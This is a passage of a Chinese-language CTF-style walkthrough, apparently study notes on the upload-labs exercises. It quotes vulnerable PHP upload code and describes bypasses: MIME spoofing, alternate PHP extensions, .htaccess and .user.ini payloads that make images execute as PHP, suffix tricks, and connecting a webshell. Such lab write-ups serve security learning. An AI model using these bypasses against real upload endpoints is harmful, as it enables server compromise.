class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;     <span class="hljs-comment">//把这行就改一下就阔以啦</span><br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="page-02-Content-Type-MIME验证"><a href="#page-02-Content-Type-MIME验证" class="headerlink" title="page-02 Content-Type(MIME验证)"></a>page-02 Content-Type(MIME验证)</h1><p>1种常见验证，即验证文件类型</p><h2 id="扫盲-MIME"><a href="#扫盲-MIME" class="headerlink" title="扫盲: MIME"></a>扫盲: MIME</h2><p>就是抓包时出现的Content-Type字段，比如这次上传1个.php文件，那发送的请求就是: Content-Type: application&#x2F;octet-stream<br>这里的application&#x2F;octet-stream表示字节流(内容是字节)</p><p>然后有些后端会对Content-Type进行验证，那么只要将其改为允许上传的类型就阔以了(比如: image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif)</p><h2 id="Content-Type抄作业"><a href="#Content-Type抄作业" class="headerlink" title="Content-Type抄作业"></a>Content-Type抄作业</h2><p>常见的媒体格式类型如下：</p><p>text&#x2F;html ： HTML格式<br>text&#x2F;plain ：纯文本格式<br>text&#x2F;xml ： XML格式<br>image&#x2F;gif ：gif图片格式<br>image&#x2F;jpeg ：jpg图片格式<br>image&#x2F;png：png图片格式<br>以application开头的媒体格式类型：</p><p>application&#x2F;xhtml+xml ：XHTML格式<br>application&#x2F;xml： XML数据格式<br>application&#x2F;atom+xml ：Atom XML聚合格式<br>application&#x2F;json： JSON数据格式<br>application&#x2F;pdf：pdf格式<br>application&#x2F;msword ： Word文档格式<br>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）<br>application&#x2F;x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）<br>另外一种常见的媒体格式是上传文件之时使用的：</p><p>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式(比如上传.htaccess)</p><h1 id="page-03-黑名单绕过…"><a href="#page-03-黑名单绕过…" class="headerlink" title="page-03 黑名单绕过…"></a>page-03 黑名单绕过…</h1><p>查看提示: 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p><p>ok…..这次试着自己做….<br>先试试大小写: p4yload.pHp，8行<br>再试试%00截断: p4yload.pHp%00.jpg，成功了，但是查看保存的文件名，并8是p4yload.pHp，导致蚁剑没法连，这是为什么呢?<br><img src="/images/%E5%88%B7%E9%A2%98/upload_labs(1).png"><br>试着用burp一次次改后缀名:<br>%00: 错<br>0x00: 错<br>.0x00: 错</p><p>??我不理解，但是这后面坑定会讲到，于是先放下</p><p>然后看wp，wp是猜测这阔能是黑名单，于是上传了.php5后缀(还可以是.phtml&#x2F;.phps&#x2F;.pht)<br>但是要想上传后能执行，要在自己的apache的httpd.conf文件写入</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span><br></code></pre></td></tr></table></figure><h1 id="page-04-hatccess"><a href="#page-04-hatccess" class="headerlink" title="page-04 .hatccess"></a>page-04 .hatccess</h1><p>查看提示: 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p><p>圈这么一堆，那就是黑名单了…<br>(这种时候1个1个试太麻烦，就感觉很有必要写一手自己的脚本了…)</p><p>然后wp的做法是: 利用.hatccess文件，这个文件利用的前提: 在apache的httpd.conf中将LoadModule rewrite_module modules&#x2F;mod_rewrite.so打开(即把对应的注释删除)还有AllowOverride All   实战中遇到没打开的就寄(比如像我这个就没打开，于是显示8出来…)<br>在上传的文件中写这样一句话:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure><p>这样所有的文件就都会被当做php文件解析啦(但是原理8太明白….)<br>或者是: </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>(写一个.htaccess文件去把.jpg解析成.php)<br>在传.htaccess的时候可能会遇到MIME验证，抓包随便改一下就行辽，8影响</p><h2 id="AllowOverride参数"><a href="#AllowOverride参数" class="headerlink" title="AllowOverride参数"></a>AllowOverride参数</h2><p>AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件，如果设置为All,那么所有在.htaccess文件里有的指令都将被重写</p><h1 id="page-05-user-ini"><a href="#page-05-user-ini" class="headerlink" title="page-05 user.ini"></a>page-05 user.ini</h1><p>查看hint: 上传目录存在php文件（readme.php）<br>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么阔以看到，源码里进行了大小写转换，于是这关用大小写绕过是8行的….</p><p>那么根据源码提示，访问 upload&#x2F;readme.php，然后发现这样一句话:<br>该目录是上传文件保存，该文件为系统说明文件，请勿删除！</p><p>思路: 修改read.php文件。<br>那么如何通过上传文件修改readme.php呢?</p><p>上谷歌查，然后发现有个通过.ini文件来绕过的思路: .ini，就是配置文件的一种<br>想引发这个漏洞，有3个条件: 看求8懂，略</p><p>写个payload: </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">666</span>.jpg<br></code></pre></td></tr></table></figure><p>这句话的意思: 所有的php文件都自动包含666.jpg文件</p><p>然后上传666.jpg，其内容为一句话木马—-<br>然后等待5min(刷新时间)，就阔以用蚁剑连了</p><h1 id="page-06-大小写绕过-后缀名8分大小写"><a href="#page-06-大小写绕过-后缀名8分大小写" class="headerlink" title="page-06 大小写绕过(后缀名8分大小写)"></a>page-06 大小写绕过(后缀名8分大小写)</h1><p>首先，盲注的话，觉得8科学，所以还是要代码审计<br>于是点击查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php">/ page-<span class="hljs-number">6</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//返回.以及以后的部分</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空   首尾去空格，这是为什么捏</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>; <span class="hljs-comment">//ok..这个是给文件换了个随机数名字</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>好，审完了，开始构造payload: 它进行首尾去空格的操作，然后给文件换了个随机数名字，这就算传上去了要怎么访问? 那自然是爆破<br>然后可以看到没有进行大小写转化，于是可以进行绕过</p><p>绕过之后看看upload的文件夹，发现上传成功了，但是名字是随机数，对于这个，可以用burp爆破进行访问，然后找到后用菜刀直连</p><h1 id="page-7-空格后缀绕过"><a href="#page-7-空格后缀绕过" class="headerlink" title="page-7 空格后缀绕过"></a>page-7 空格后缀绕过</h1><p>查看提示，没啥鸟用，于是查看源码: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有发现去掉首尾空格的函数，于是我觉得阔以通过空格后缀绕过，事实也果然，burp抓包，在结尾加空格即可<br>….提示上传出错….我服了，这他妈是什么情况??? 查看源码，也找8到问题所在，wdnmd</p><h1 id="page-08-后缀名加点绕过"><a href="#page-08-后缀名加点绕过" class="headerlink" title="page-08 后缀名加点绕过"></a>page-08 后缀名加点绕过</h1><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span 